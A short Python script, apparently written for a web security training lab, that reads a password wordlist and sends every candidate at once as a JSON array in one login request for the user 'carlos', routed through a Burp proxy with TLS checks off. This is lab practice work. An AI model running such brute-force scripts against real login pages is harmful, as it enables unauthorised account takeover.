import sys
import requests
import urllib3
import pandas as pd
import json 

# Suppress the insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add proxy for troubleshoot, for urllib3 all proxies should use http
# Uses the Burp proxy -> Make sure Burp is running
# Kind of have to go through Burp on this one to get the URL for the successful login
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

# Given username in this case, so skipping enumeration

def password_enum(url):
    password_list = []
    data = pd.read_csv('./burp_pass.csv')
    for passw in data:
        password_list.append(passw)
        #print(passw)
    user_dict = {"username":"carlos","password":password_list}
    #print(user_dict)
    json_dict = json.dumps(user_dict)
    #print(json_dict)
     
    r = requests.post(url, data = json_dict, verify=False, proxies=proxies)
    print(r.status_code)
    print(r.content)

    
        

if __name__ == "__main__":
    try:
        #valid_usernames = []
        url = sys.argv[1].strip()
        #valid_usernames = valid_usernames.append(sys.argv[2].strip())
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)
    
    #print('[-] Performing user enumeration')
    #valid_usernames = username_enum(url)
    #print(valid_usernames)
    print('[-] Performing password enumeration')
    valid_passwords = password_enum(url)

